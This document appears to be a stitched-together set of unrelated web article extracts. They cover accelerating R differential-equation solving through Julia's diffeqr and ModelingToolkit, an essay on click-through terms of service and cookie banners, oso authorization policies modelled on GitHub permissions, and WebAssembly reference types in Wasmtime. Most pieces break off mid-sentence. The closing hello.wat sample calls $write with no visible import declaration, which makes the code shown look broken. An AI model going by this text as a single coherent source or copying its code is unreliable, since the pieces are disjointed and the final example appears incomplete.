<ol>
<li>The new direct wrapping interface of diffeqr</li>
<li>JIT compilation and symbolic analysis of ODEs and SDEs in R using Julia and <a href="https://github.com/SciML/ModelingToolkit.jl">ModelingToolkit.jl</a></li>
<li>GPU-accelerated simulations of ensembles using Julia's <a href="https://github.com/SciML/DiffEqGPU.jl">DiffEqGPU.jl</a></li>
</ol>
<p>Together we will demonstrate how models in R can be accelerated by 1000x without a user ever having to write anything but R.</p>
<h2>A Quick Note Before Continuing</h2>
<p>Before continuing on with showing all of the features, I wanted to ask for support so that we can continue developing these bridged libraries. Specifically, I would like to be able to support developers interested in providing a fully automated Julia installation and static compilation so that calling into Julia libraries is just as easy as any Rcpp library. To show support, the easiest thing to do is to star our libraries. The work of this blog post is build on <a href="https://github.com/SciML/DifferentialEquations.jl">DifferentialEquations.jl</a>, <a href="https://github.com/SciML/diffeqr">diffeqr</a>, <a href="https://github.com/SciML/ModelingToolkit.jl">ModelingToolkit.jl</a>, and <a href="https://github.com/SciML/DiffEqGPU.jl">DiffEqGPU.jl</a>. Thank you for your patience and now back to our regularly scheduled program.</p>
<h2>diffeqr v1.0: Direct wrappers for Differential Equation Solving in R</h2>
<p>First let me start with the new direct wrappers of differential equations solvers in R. In the previous iterations of diffeqr, we had relied on specifically designed high level functions, like "ode_solve", to compensate for the fact that one could not directly use Julia's original DifferentialEquations.jl interface directly from R. However, the new diffeqr v1.0 directly exposes the entirety of the Julia library in an easy to use framework.</p>
<p>To demonstrate this, let's see how to define the Lorenz ODE with diffeqr. In Julia's DifferentialEquations.jl, we would start by defining an "ODEProblem" that contains the initial condition u0, the time span, the parameters, and the f in terms of `u' = f(u,p,t)` that defines the derivative. In Julia, this would look like:</p>


<div><div><div><div><div><div><div><pre><span>using</span> DifferentialEquations
<span>function</span> lorenz<span>(</span>du,u,p,t<span>)</span>
  du<span>[</span><span>1</span><span>]</span> = p<span>[</span><span>1</span><span>]</span><span>*</span><span>(</span>u<span>[</span><span>2</span><span>]</span>-u<span>[</span><span>1</span><span>]</span><span>)</span>
  du<span>[</span><span>2</span><span>]</span> = u<span>[</span><span>1</span><span>]</span><span>*</span><span>(</span>p<span>[</span><span>2</span><span>]</span>-u<span>[</span><span>3</span><span>]</span><span>)</span> - u<span>[</span><span>2</span><span>]</span>
  du<span>[</span><span>3</span><span>]</span> = u<span>[</span><span>1</span><span>]</span><span>*</span>u<span>[</span><span>2</span><span>]</span> - p<span>[</span><span>3</span><span>]</span><span>*</span>u<span>[</span><span>3</span><span>]</span>
<span>end</span>
u0 = <span>[</span><span>1.0</span>,<span>1.0</span>,<span>1.0</span><span>]</span>
tspan = <span>(</span><span>0.0</span>,<span>100.0</span><span>)</span>
p = <span>[</span><span>10.0</span>,<span>28.0</span>,<span>8</span>/<span>3</span><span>]</span>
prob = ODEProblem<span>(</span>lorenz,u0,tspan,p<span>)</span>
sol = solve<span>(</span>prob,saveat=<span>1.0</span><span>)</span></pre></div></div></div></div></div></div></div>


<p>With the new diffeqr, diffeq_setup() is a function that does a few things:</p>
<ol>
<li>It instantiates a Julia process to utilize as its underlying compute engine</li>
<li>It first checks if the correct Julia libraries are installed and, if not, it installs them for you</li>
<li>Then it exposes all of the functions of DifferentialEquations.jl into its object</li>
</ol>
<p>What this means is that the following is the complete diffeqr v1.0 code for solving the Lorenz equation is:</p>


<div><div><div><div><div><div><div><pre>library(diffeqr)
de &lt;- diffeqr::diffeq_setup()
f &lt;- function(u,p,t) {
  du1 = p[1]*(u[2]-u[1])
  du2 = u[1]*(p[2]-u[3]) - u[2]
  du3 = u[1]*u[2] - p[3]*u[3]
  return(c(du1,du2,du3))
}
u0 &lt;- c(1.0,1.0,1.0)
tspan &lt;- c(0.0,100.0)
p &lt;- c(10.0,28.0,8/3)
prob &lt;- de$ODEProblem(f, u0, tspan, p)
sol &lt;- de$solve(prob,saveat=1.0)</pre></div></div></div></div></div></div></div>


<p>This then carries on through SDEs, DDEs, DAEs, and more. Through this direct exposing form, the whole library of DifferentialEquations.jl is at the finger tips of any R user, making it a truly cross-language platform.</p>
<p>(Note that the only caveat is that diffeq_setup requires that the user has already installed Julia and julia is included in the path. We hope that future developments can eliminate this need.)</p>
<h2>JIT compilation and symbolic analysis of ODEs and SDEs in R via ModelingToolkit.jl</h2>
<p>The reason for Julia is speed (well and other things, but here, SPEED!). Using the pure Julia library, we can solve the Lorenz equation 100 times in about 0.05 seconds:</p>


<div><div><div><div><div><div><div><pre>@<span>time</span> <span>for</span> i <span>in</span> <span>1</span>:<span>100</span> solve<span>(</span>prob,saveat=<span>1.0</span><span>)</span> <span>end</span>
<span>0.048237</span> seconds <span>(</span><span>156.80</span> k allocations: <span>6.842</span> MiB<span>)</span>
<span>0.048231</span> seconds <span>(</span><span>156.80</span> k allocations: <span>6.842</span> MiB<span>)</span>
<span>0.048659</span> seconds <span>(</span><span>156.80</span> k allocations: <span>6.842</span> MiB<span>)</span></pre></div></div></div></div></div></div></div>


<p>Using diffeqr connected version, we get:</p>


<div><div><div><div><div><div><div><pre>lorenz_solve &lt;- function (i){
  de$solve(prob,saveat=1.0)
}
&nbsp;
&gt; system.time({ lapply(1:100,lorenz_solve) })
   user  system elapsed
   6.81    0.02    6.83
&gt; system.time({ lapply(1:100,lorenz_solve) })
   user  system elapsed
   7.09    0.00    7.10
&gt; system.time({ lapply(1:100,lorenz_solve) })
   user  system elapsed
   6.78    0.00    6.79</pre></div></div></div></div></div></div></div>


<p>That's not good, that's about 100x difference! In <a href="https://www.stochasticlifestyle.com/why-numba-and-cython-are-not-substitutes-for-julia/">this blog post I described that interpreter overhead and context switching</a> are the main causes of this issue. We've also demonstrated that <a href="https://gist.github.com/ChrisRackauckas/cc6ac746e2dfd285c28e0584a2bfd320">ML accelerators like</a> <a href="https://gist.github.com/ChrisRackauckas/6a03e7b151c86b32d74b41af54d495c6">PyTorch</a> generally do not perform well in this regime since those kinds of accelerators rely on heavy array operations, unlike the scalarized nonlinear interactions seen in a lot of differential equation modeling. For this reason we cannot just slap any old JIT compiler onto the f call and then put it into the function since there would still be left over. So we need to do something a bit tricky.</p>
<p>In my <a href="https://www.youtube.com/watch?v=UNkXNZZ3hSw">JuliaCon 2020 talk, Automated Optimization and Parallelism in DifferentialEquations.jl</a> I demonstrated how <a href="https://github.com/SciML/ModelingToolkit.jl">ModelingToolkit.jl</a> can be used to trace functions and generate <a href="https://mtk.sciml.ai/dev/tutorials/auto_parallel/">highly optimized sparse and parallel code</a> for scientific computing all in an automated fashion. It turns out that JuliaCall can do a form of tracing on R functions, something that exploited to allow <a href="https://github.com/Non-Contradiction/autodiffr">autodiffr to automatically differentiate R code with Julia's AD libraries</a>. Thus it turns out that the same <a href="https://github.com/SciML/AutoOptimize.jl">modelingtoolkitization methods used in AutoOptimize.jl</a> can be used on a subset of R codes which includes a large majority of differential equation models.</p>
<p>In short, we can perform automated acceleration of R code by turning it into sparse parallel Julia code. This was exposed in diffeqr v1.0 as the `jitoptimize_ode(de,prob)` function (also `jitoptimize_sde(de,prob)`). Let's try it out on this example. All you need to do is give it the ODEProblem which you wish to accelerate. Let's take the last problem and turn it into a pure Julia defined problem and then time it:</p>


<div><div><div><div><div><div><div><pre>fastprob &lt;- diffeqr::jitoptimize_ode(de,prob)
fast_lorenz_solve &lt;- function (i){
  de$solve(fastprob,saveat=1.0)
}
&nbsp;
system.time({ lapply(1:100,fast_lorenz_solve) })
&nbsp;
&gt; system.time({ lapply(1:100,fast_lorenz_solve) })
   user  system elapsed
   0.05    0.00    0.04
&gt; system.time({ lapply(1:100,fast_lorenz_solve) })
   user  system elapsed
   0.07    0.00    0.06
&gt; system.time({ lapply(1:100,fast_lorenz_solve) })
   user  system elapsed
   0.07    0.00    0.06</pre></div></div></div></div></div></div></div>


<p>And there you go, an R user can get the full benefits of Julia's optimizing JIT compiler without having to write lick of Julia code! This function also did a few other things, like automatically defined the <a href="https://diffeq.sciml.ai/stable/tutorials/advanced_ode_example/#Automatic-Sparsity-Detection">Jacobian code to make implicit solving of stiff ODEs much faster as well</a>, and it can perform sparsity detection and automatically optimize computations on that.</p>
<p>To see how much of an advance this is, note that this Lorenz equation is the same from the <a href="http://desolve.r-forge.r-project.org/">deSolve examples page</a>. So let's take their example and see how well it performs:</p>


<div><div><div><div><div><div><div><pre>library(deSolve)
Lorenz &lt;- function(t, state, parameters) {
  with(as.list(c(state, parameters)), {
    dX &lt;-  a * X + Y * Z
    dY &lt;-  b * (Y - Z)
    dZ &lt;- -X * Y + c * Y - Z
    list(c(dX, dY, dZ))
  })
}
&nbsp;
parameters &lt;- c(a = -8/3, b = -10, c = 28)
state      &lt;- c(X = 1, Y = 1, Z = 1)
times      &lt;- seq(0, 100, by = 1.0)
out &lt;- ode(y = state, times = times, func = Lorenz, parms = parameters)
&nbsp;
desolve_lorenz_solve &lt;- function (i){
  state      &lt;- c(X = runif(1), Y = runif(1), Z = runif(1))
  parameters &lt;- c(a = -8/3 * runif(1), b = -10 * runif(1), c = 28 * runif(1))
  out &lt;- ode(y = state, times = times, func = Lorenz, parms = parameters)
}
&nbsp;
&gt; system.time({ lapply(1:100,desolve_lorenz_solve) })
   user  system elapsed
   5.03    0.03    5.07
&gt;
&gt; system.time({ lapply(1:100,desolve_lorenz_solve) })
   user  system elapsed
   5.42    0.00    5.44
&gt; system.time({ lapply(1:100,desolve_lorenz_solve) })
   user  system elapsed
   5.41    0.00    5.41</pre></div></div></div></div></div></div></div>


<p>Thus we see 100x acceleration over the leading R library without users having to write anything but R code. This is the true promise in action of a "language of libraries" helping to extend all other high level languages!</p>
<h2>GPU-acceleration of ODEs in R via DiffEqGPU.jl</h2>
<p>Can we go deeper? Yes we can. In many cases like in <a href="https://www.stochasticlifestyle.com/how-inexact-models-can-guide-decision-making-in-quantitative-systems-pharmacology/">optimization and sensitivity analysis of models for pharmacology</a> the users need to solve the same …</p></div></div></div>

	<article id="post-143">
		<!-- .entry-header -->
		<div>
			




<p><em>Written on May 5, 2019</em></p>







<p><em>In which I muse about the consequences of how we are forced to lie when we use the internet and our gadgets.</em></p>











<p>Perhaps the ancient tribes of Judea predicted Facebook. They wrote</p>



<blockquote><p>You shall not spread a false report.</p><cite>EXODUS 23:1, first published in approx. 1446 BCE by Ancient Scholars. All rights reserved.<br></cite></blockquote>



<p>But before you read on, please confirm the following:</p>



<p> I have read and agree to your terms for reading this article.</p>



<p>Warning: if you happen to be in Burkina Faso, and you found this article using a Yahoo search through Safari, then I am afraid the people in Apple’s legal department want to talk to you. You have just violated section 16 of the agreement that you read and agreed to. (Article 16 only allows you to use Yahoo search in Argentina, Aruba, Australia, Austria, Barbados, Belgium, Bermuda, Brazil, Bulgaria, Canada, Cayman Islands, Chile, China mainland, Hong Kong, Taiwan, Colombia, Cyprus, Czech Republic, Denmark, Dominican Republic, Ecuador, El Salvador, Finland, France, Germany, Greece, Grenada, Guatemala, Hungary, Iceland, India, Indonesia, Ireland, Italy, Jamaica, Japan, Latvia, Lithuania, Luxembourg, Malaysia, Malta, Mexico, Netherlands, New Zealand, Nicaragua, Norway, Panama, Peru, Philippines, Poland, Portugal, Puerto Rico, Romania, Singapore, Slovakia, Slovenia, South Korea, Spain, St. Lucia, St. Vincent, Sweden, Switzerland, Thailand, The Bahamas, Trinidad and Tobago, Turkey, UK, Uruguay, US and Venezuela.)</p>



<p>Wait, Apple’s lawyers don’t want to talk to you:</p>



<blockquote><p><strong>6. Termination.&nbsp;</strong>This License is effective until terminated. Your rights under this License will terminate automatically or otherwise cease to be effective without notice from Apple if you fail to comply with any term(s) of this License. Upon the termination of this License, you shall cease all use of the iOS Software. Sections 4, 5, 6, 7, 8, 9, 12 and 13 of this License shall survive any such termination.</p></blockquote>



<p>Apparently, even if in a moment of weakness you agree to the terms, but then change your mind, you are still bound by sections 4 through 9 and sections 12 and 13 of the agreement. How can this make any kind of sense? By the way, most of these survival clauses are just silly. For example, notice that section 6 (Termination) remains in effect after termination. I am unable to understand what this can possibly mean. The other early clauses concern consent from you to Apple to use certain information that you have provided through use of the software. Well, even if you change your mind about this agreement, you cannot ask Apple to erase any information they (legally) gathered before you terminated the agreement. </p>



<p>Let me be clear, though, this is not to bash Apple. Their agreement is probably no different from many other agreements you have “read and agreed to”. Adobe, for example, have many agreements, and, while they are shorter and better written than the Apple ones, they have their own share of strangeness. For example, Photoshop users have agreed, section 6 paragraph c, not to:</p>



<blockquote><p>(c) use the Software to construct any kind of database;</p></blockquote>



<p>I really have no idea at all what this means. And yet I have to agree to it. Surely my collection of photographs, the very reason I use Photoshop in the first place is <em>some kind</em> of database?</p>



<p>My randomized research project (that is, travelling on the Canada Line train) reveals to me clearly that the vast majority of people who use iPhones and similar gadgets are way (and I mean a long way) younger than you and me. Let’s pick 14 year old Charles over there, happily doing something on his iPhone XS. Apparently, he read, comprehended, and agreed that:</p>



<blockquote><p>The iOS Software contains functionality that allows it to accept digital certificates either issued from Apple or from third parties. YOU ARE SOLELY RESPONSIBLE FOR DECIDING WHETHER OR NOT TO RELY ON A CERTIFICATE WHETHER ISSUED BY APPLE OR A THIRD PARTY.</p></blockquote>



<p>Or how about this:</p>



<blockquote><p>(a) The iOS Software is licensed under the MPEG-4 Systems Patent Portfolio License for encoding in compliance with the MPEG-4 Systems Standard, except that an additional license and payment of royalties are necessary for encoding in connection with (i) data stored or replicated in physical media which is paid for on a title by title basis and/or (ii) data which is paid for on a title by title basis and is transmitted to an end user for permanent storage and/or use. Such additional license may be obtained from MPEG LA, LLC. See http://www.mpegla.com for additional details.</p></blockquote>



<p>What? Charles, we need to talk. Because I don’t understand these two sections that I read and agreed to. Perhaps you can explain them to me.</p>



<p>On your behalf, dear reader, I decided to visit “mpegla.com”. This was not helpful. For one thing, my brain has become accustomed to shutting down every time I see the phrase “The world’s leading whatever” and MPEG LA, it turns out, claim to be the world’s leading “packager and provider of one stop licenses for standards and other technology platforms.”</p>



<p>Actually, I don’t think it was hard for them to make this claim, because as far as I and Professor Google can tell, they are the <strong>only</strong> such “packager and provider”. </p>



<p>Lets talk about Cookies. Due to legislation in Europe, by well meaning officials, web sites that offer content in Europe are required to obtain a users consent before storing cookies on your computer. It turns out that this bit of legislation is universally mostly ignored. If an organization wanted to be fully compliant, then the first time you visited them, you would have to land on a cookie-free page that asked your consent before you could proceed to their actual content. No one does this. Instead, there are various compromises. I like this one, placed on the bottom of the page:</p>



<blockquote><p>This website uses cookies in order to improve user experience. If you close this box or continue browsing, we will assume you agree with this. For more information about the cookies we use or to find out how you can disable cookies, click here.</p></blockquote>



<p>This is in actual violation of the law, because that web site stores a cookie whether or not you close the box. It is in violation because of Section 5, paragraph 3 of the relevant EU directive which says:</p>



<blockquote><p>3. Member States shall ensure that the use of electronic communications networks to store information or to gain access to information stored in the terminal equipment of a subscriber or user is only allowed on condition that the subscriber or user concerned is provided with clear and comprehensive information in accordance with Directive 95/46/EC, inter alia about the purposes of the processing, and is offered the right to refuse such processing by the data controller. </p></blockquote>



<p>Much worse, of course, are the sites that ask you the “I have read and accept” intrusion.</p>



<p>There is no doubt that the EU directive has not been pleasant, either for organizations with web sites, or the consumers of these sites. And, of course, not only are we reading things we <em>know</em> to be lies (<em>“This website uses cookies to improve user experience”</em>), but we are often forced to lie in order to read the web page.</p>



<p>So-called “<a href="https://en.wikipedia.org/wiki/Surveillance_capitalism">Surveillance Capitalism</a>” is forcing you, your friends, and your children to lie. Often. Perhaps we should call it Wink-Wink Capitalism. We are all complicit, know what I mean, nudge-nudge, wink-wink?</p>



<p>Now I think there are technical ways to improve cookie treatment, but I will leave that to a possible future article. What worries me mostly are the long-term psychological consequences of what has become routine lying. Of course, this kind of lying is not restricted to web pages. Do you believe this:</p>



<blockquote><p>Please listen carefully, as our menu options have changed</p></blockquote>



<p>Really? When?</p>



<p>Or this:</p>



<blockquote><p>Due to higher than expected call volumes, there may be a longer than usual delay</p></blockquote>



<p>How about this recent press release:</p>



<blockquote><p>Today Hootsuite communicated organizational changes in order to drive greater alignment with our growing company’s strategic priorities that best serve our customers. Unfortunately, this included some reductions to our staff.</p></blockquote>



<p>Perhaps this gives new meaning to the phrase “half-truth” – the part about “reductions”, also known as termination of employment, is true.</p>



<p>Most of us grew up with the belief that telling the truth was important. We were allowed some exceptions, called “white lies”, mostly if it seemed necessary to avoid inflicting unnecessary hurt.</p>



<p>Sadly, the internet has habituated us to lying. If you are someone who has actually read the terms and conditions of every piece of software before you checked the box, then… I don’t believe you. It just is not reasonable to expect you to do this. </p>



<p>The question that I leave you with is simply this. Can we do better?</p>

August 27, 2020 | https://www.osohq.com/post/building-the-github-authorization-model-using-oso | <a href="https://web.archive.org/web/*/https://www.osohq.com/post/building-the-github-authorization-model-using-oso">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>When the oso team first started tackling problems in the authorization space, we looked to GitHub permissions as a canonical example of the not-so-simple authorization patterns that can quickly become overwhelming to maintain in application code.</p><p>GitHub provides a pure example of what motivates authorization in the first place—securing access to resources. In GitHub, the resources are repositories<strong>,</strong> and users may or may not be able to take certain actions on them. Repositories may be created, destroyed, read, or edited in any number of ways, and have child resources (issues, wikis, branches, etc.) whose access control is related to that of their parent resource. And permissions hierarchies are not limited to resources. Users can be grouped into organizations, and further grouped into teams and sub-teams, which complicates the business of controlling access even more.</p><p>In this post, we'll show how to incrementally build complex policies with oso. We'll use GitHub's authorization model as an example, but the patterns we cover, including ownership, hierarchical permissions, and nested resources, are common to many user-facing applications.</p><p><strong>Note:</strong> this post will focus on oso policies and authorization logic<em>, </em>and won't go into detail on how use the oso library. For more information on this, see our <a href="https://docs.osohq.com/getting-started/application/index.html" target="_blank">guide</a> on adding oso to your application. As of this writing, oso's <a href="https://docs.osohq.com/using/libraries/index.html" target="_blank">open-source libraries</a> are available in Python, Ruby, Java and Node.js.</p><h4>A note on GitHub permissions</h4><p>Permissions in GitHub revolve around managing access to repositories. If you're unfamiliar with GitHub permissions, you can find a nice overview <a href="https://docs.github.com/en/github/getting-started-with-github/access-permissions-on-github" target="_blank">here</a>.</p><h3>Basic access: owners and collaborators</h3><figure><p><img src="https://uploads-ssl.webflow.com/5f1483105c9a72fd0a3b662a/5f4677cc06628a2d540eb123_Untitled.png" alt=""></p></figure><p>Let's start with GitHub's simplest authorization use case: user accounts and repositories. If I sign into my personal GitHub account and create a repository, I am the <strong>owner</strong> of that repository. To understand what this means, let's look at the permissions available for user-owned repositories:</p><ul role="list"><li>Admin</li><li>Write</li><li>Read</li></ul><p>These three permission levels determine every action someone can take on a user-owned repository. As the owner, I get {% c-line %}"ADMIN"{% c-line-end %} privileges, which means I can do <em>whatever I want</em> to my repository. {% c-line %}"WRITE"{% c-line-end %} goes to <strong>collaborators,</strong> which we'll talk about in a minute. And if the repository is public, the rest of the world gets to {% c-line %}"READ"{% c-line-end %} it, whether or not they are even logged in. </p><p>Let's look at what these rules might look like in an <a href="https://docs.osohq.com/getting-started/policies/index.html" target="_blank">oso policy</a>. The policy below, like all oso policies, is written in a declarative policy language called Polar.</p><div><p>{% c-block language="polar" %}<br># Owners can take any action on their own repositories.<br>allow(actor: User, _action, resource: Repository) if<br>&nbsp;&nbsp;&nbsp;&nbsp;permission(actor, "ADMIN", resource);</p><p># Organization owners are admins of all organization repositories.<br># Repository owners are admins of their own repositories. <br>permission(actor: User, "ADMIN", resource: Repository) if	<br>&nbsp;&nbsp;&nbsp;&nbsp;role(actor, "OWNER", resource);</p><p># Rule specifying repository ownership, <br># based on data stored on application objects.<br>role(actor: User, "OWNER", resource: Repository) if<br>&nbsp;&nbsp;&nbsp;&nbsp;resource.owner matches User{id: actor.id};</p><p># Anyone can read a public repository.<br>permission(_actor, "READ", resource: Repository) if<br>&nbsp;&nbsp;&nbsp;&nbsp;not resource.isPrivate;<br>{% c-block-end %}</p></div><p>We've created a couple different kinds of rules here. The standard oso <a href="https://docs.osohq.com/more/glossary.html#allow-rules" target="_blank">allow</a> rule is the starting point for evaluating any authorization request. </p><p>We can name our other rules whatever we want, and we've defined them to match GitHub's terminology. We're using {% c-line %}role{% c-line-end %} rules to specify the <strong>role</strong> of a user with respect to a particular resource (i.e., owner of a Repository), and permission to specify a user's permission level (i.e. read). We'll use these supplementary rules when we add more <strong>allow</strong> rules to the policy later on.</p><p>One other thing to note about these rules: the {% c-line %}User{% c-line-end %} and {% c-line %}Repository{% c-line-end %} types specified for actors and resources refer to the object types actually used in the GitHub application code. </p><p>oso makes it possible to pass <a href="https://docs.osohq.com/getting-started/policies/application-types.html" target="_blank">application objects</a> directly into the policy evaluation engine.</p><p>As mentioned earlier, there's another type of user that can access repositories owned by user accounts—collaborators. Repository owners can invite collaborators to a repository. We can access a repository's collaborators with the {% c-line %}.collaborators{% c-line-end %} field; each collaborator has an {% c-line %}id{% c-line-end %} field and a {% c-line %}permission{% c-line-end %} field, which we can use in our policy:</p><p>{% c-block language="polar" %}<br># Look up an actor's permission level from the repository's collaborator list.<br>permission(actor: User, role, resource: Repository) if	<br>&nbsp;&nbsp;&nbsp;&nbsp;collab in resource.collaborators and	<br>&nbsp;&nbsp;&nbsp;&nbsp;actor.id = collab.id and	<br> &nbsp;&nbsp;&nbsp;role = collab.permission;<br>{% c-block-end %}</p><h4>A quirk about GitHub permissions</h4><p>As we've seen, the permissions on user-account-owned repositories are pretty basic and coarse. The next level of complexity in the GitHub authorization model is Organizations. As you might already know, GitHub repositories can also be owned by <strong>organization accounts.</strong> And it turns out that the permissions work quite differently with organizations than with user accounts. But let's see if we can use oso to add organizations with as few changes as possible.</p><h3>Organizations</h3><figure id="w-node-7ccfaf29303c-8e3b6817"><p><img src="https://uploads-ssl.webflow.com/5f1483105c9a72fd0a3b662a/5f467d32ecc6f33537857cf3_Screen_Shot_2020-08-26_at_11.16.43_AM.png" alt=""></p></figure><p>GitHub organizations have three user types:</p><ul role="list"><li>Owners</li><li>Billing managers</li><li>Members</li></ul><p>We're going to focus on owners and members. Like repository owners, organization owners can take any action on the organization.</p><div><p>{% c-block language="polar" %}<br>allow(actor: User, _action, resource: Organization) if	<br>&nbsp;&nbsp;&nbsp;&nbsp;role(actor, "OWNER", resource);</p><p># Rule specifying organization ownership.<br># Note that using the `Organization` specializer prevents it <br># from conflicting with our rule for repository ownership. <br>role(actor: User, "OWNER", resource: Organization) if	<br>&nbsp;&nbsp;&nbsp;&nbsp;member in resource.membersWithRole and	<br>&nbsp;&nbsp;&nbsp;&nbsp;member.role = "ADMIN" and	<br>&nbsp;&nbsp;&nbsp;&nbsp;member.id = actor.id;</p><p>role(actor: User, "MEMBER", resource: Organization) if	<br>&nbsp;&nbsp;&nbsp;&nbsp;member in resource.membersWithRole and	<br>&nbsp;&nbsp;&nbsp;&nbsp;member.id = actor.id;<br>{% c-block-end %}</p></div><p>Notice that the logic for defining organization owners is different from the logic for defining repository owners. Organizations do not have an {% c-line %}owner{% c-line-end %} field (there can be multiple owners). Instead, organizations store owners in the {% c-line %}.membersWithRole{% c-line-end %} field, along with every other organization member. GitHub distinguishes owners from other members by giving them a role called {% c-line %}"ADMIN"{% c-line-end %} (not to be confused with the {% c-line %}"ADMIN"{% c-line-end %} permission level for repositories). Normal members simply have the {% c-line %}"MEMBER"{% c-line-end %} role.</p><p>If you didn't get all that, not to worry. All you really need to know is that this logic reflects our best approximation of how the data would actually be stored in GitHub's application, which is why it looks a little strange.</p><p>We can now use the role rules we've written to specify permissions for repositories within organizations. Org members can have any of the following permission levels for a repository in an organization:</p><ul role="list"><li>Read</li><li>Triage</li><li>Write</li><li>Maintain</li><li>Admin</li></ul><p>Organization owners always have {% c-line %}"ADMIN"{% c-line-end %} permissions, for all repositories. This means that we now have two conditions that always give users {% c-line %}"ADMIN"{% c-line-end %} permissions on repositories: 1) if the user owns the repository, and 2) if the user owns the organization that owns the repository. The second condition can be enforced by adding one line to the existing rule for the {% c-line %}"ADMIN"{% c-line-end %} permission:</p><p>{% c-block language="polar" %}<br># Repository owners are admins of their own repositories. <br># Organization owners are admins of all organization repositories.<br>permission(actor: User, "ADMIN", resource: Repository) if<br>&nbsp;&nbsp;&nbsp;&nbsp;role(actor, "OWNER", resource) or<br>&nbsp;&nbsp;&nbsp;&nbsp;role(actor, "OWNER", resource.owner);<br>{% c-block-end %}<br></p><p>Owner permissions? Check. Let's move on to repository permissions for plain old members. GitHub offers two ways for members to gain repository access: <strong>base permissions</strong> and <strong>direct access</strong>. The base permission is the default repository permission given to all organization members:</p><p>{% c-block language="polar" %}<br># All organization members have access to repositories from the base role.<br>permission(actor: User, permission, resource: Repository) if<br>&nbsp;&nbsp;&nbsp;&nbsp;org = resource.owner and<br>&nbsp;&nbsp;&nbsp;&nbsp;org matches Organization { baseRole: permission } and<br>&nbsp;&nbsp;&nbsp;&nbsp;role(actor, "MEMBER", org);<br>{% c-block-end %}<br></p><p>Direct access refers to permissions given directly to members by admins of the repository. Members with direct access can be found in the repository's list of <strong>collaborators. </strong>Yes, collaborators! Remember those from earlier? The rule we already wrote for collaborator permissions will work for organization-owned repositories as well.</p><h3>Teams</h3><figure id="w-node-ffc27d927b9d-8e3b6817"><p><img src="https://uploads-ssl.webflow.com/5f1483105c9a72fd0a3b662a/5f467a2acf0c4d0967b0a6ff_Untitled.png" alt=""></p></figure><p>As a quick recap, our policy now depends on three permission sources for repository access: ownership, organization base permissions, and direct access (or collaboration). <em>And each new permission source required minimal, if any modifications to our existing rules.</em> This is one benefit of declarative policies and additive rules. But we're not done yet—let's go over one more permission source for GitHub repositories: Teams.</p><p>Teams group members within organizations. Importantly for us, repository permissions can be assigned to teams in the same way that they can be assigned to individual members. Teams can have sub-teams, which <em>inherit</em> repository permissions from their parent teams. Recursive rules are useful for representing permission inheritance.</p><div><p>{% c-block language="polar" %}<br># We can write a permission rule for Teams.<br>permission(team: Team, perm, resource: Repository) if<br>&nbsp;&nbsp;&nbsp;&nbsp;team in resource.owner.teams and<br>&nbsp;&nbsp;&nbsp;&nbsp;perm = team.permission;</p><p># subteams inherit repo permissions from their parent team, if they have one.<br>permission(team: Team, perm, …</p></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>A few week ago, I finished implementing support for <a href="https://github.com/WebAssembly/reference-types/blob/master/proposals/reference-types/Overview.md">the WebAssembly reference
types proposal</a> in Wasmtime. <a href="https://github.com/bytecodealliance/wasmtime/">Wasmtime</a> is a standalone,
outside-the-Web WebAssembly runtime, and the reference types proposal is
WebAssembly’s first foray beyond simple integers and floating point numbers,
into the exciting world of garbage-collected references. This article will
explain what the reference types proposal enables, what it leaves for future
proposals, and how it is implemented in Wasmtime.</p>

<h2 id="what-are-reference-types">What are Reference Types?</h2>

<p>Without the reference types proposal, WebAssembly can only manipulate simple
integer and floating point values. It can’t take or return references to the
host’s objects like, for example, a DOM node on a Web page or an open connection
on a server. There are workarounds: for example, you can store the host objects
in a side table and refere to them by index, but this adds an extra indirection
and implementing the side table requires cooperating glue code on the host
side. That glue code, in particular, is annoying because it is outside of the
Wasm sandbox, diluting Wasm’s safety guarantees, and it is host-specific. If you
want to use your Wasm module on the Web, in a Rust host, and in a Python host,
you’ll need three separate glue code implementations. This makes WebAssembly
less attractive as a universal binary format.</p>

<p>With the reference types proposal, you don’t need glue code to interact with
host references. The proposal has three main parts:</p>

<ol>
  <li>
    <p>A new <code>externref</code> type, representing an opaque, unforgable reference to a
host object.</p>
  </li>
  <li>
    <p>An extension to WebAssembly tables, allowing them to hold <code>externref</code>s in
addition to function references.</p>
  </li>
  <li>
    <p>New instructions for manipulating tables and their entries.</p>
  </li>
</ol>

<p>With these new capabilities, Wasm modules can talk about host references
directly, rather than requiring external glue code running in the host.</p>

<p><code>externref</code>s play nice with WebAssembly’s sandboxing properties:</p>

<ul>
  <li>
    <p>They are <em>opaque</em>: a Wasm module cannot observe an <code>externref</code> value’s bit
pattern. Passing a reference to a host object into a Wasm module doesn’t
reveal any information about the host’s address space and the layout of host
objects within it.</p>
  </li>
  <li>
    <p>They are <em>unforgable</em>: a Wasm module can’t create a fake host reference out of
thin air. It can only return either a reference you already gave it or the
null reference. It <em>cannot</em> pretend like the integer value <code>0x1bad2bad</code> is a
valid host reference, return it to you, and trick you into dereferencing this
invalid pointer.</p>
  </li>
</ul>

<h2 id="example">Example</h2>

<p>Here’s a Wasm module that exports a <code>hello</code> function which takes, as an
<code>externref</code> parameter, a reference to an open file and writes “Hello, Reference
Types!” to the file. This module imports the <code>write</code> syscall from a hypothetical
future version of <a href="https://wasi.dev/">WASI</a>, the WebAssembly System Interface, that leverages
reference types.</p>

<div><div><pre><code><span>;; hello.wat</span>

<span>(</span><span>module</span>
  <span>;; Import the write syscall from a hypothetical (and</span>
  <span>;; simplified) future version of WASI.</span>
  <span>;;</span>
  <span>;; It takes a host reference to an open file, an address</span>
  <span>;; in memory, and byte length and then writes</span>
  <span>;; `memory[address..(address+length)]` to the file.</span>

  <span>;; At offset 0x42 in the memory, define our data string.</span>
  <span>(</span><span>data</span> <span>(</span><span>i32.const</span> <span>0x42</span><span>)</span> <span>"Hello, Reference Types!\n"</span><span>)</span>

  <span>;; Define a function that writes our hello string to a</span>
  <span>;; given open file handle.</span>
  <span>(</span><span>func</span> <span>(</span><span>export</span> <span>"hello"</span><span>)</span> <span>(</span><span>param</span> <span>externref</span><span>)</span>
    <span>(</span><span>call</span> <span>$write</span>
      <span>;; The open file handle we were given.</span>
      <span>(</span><span>local.get</span> <span>0</span><span>)</span>
      <span>;; The address of our string in memory.</span>
      <span>(</span><span>i32.const</span> <span>0x42</span><span>)</span>
      <span>;; The length of our string in memory.</span>
      <span>(</span><span>i32.const</span> <span>24</span><span>))</span>
    <span>;; Ignore the return code.</span>
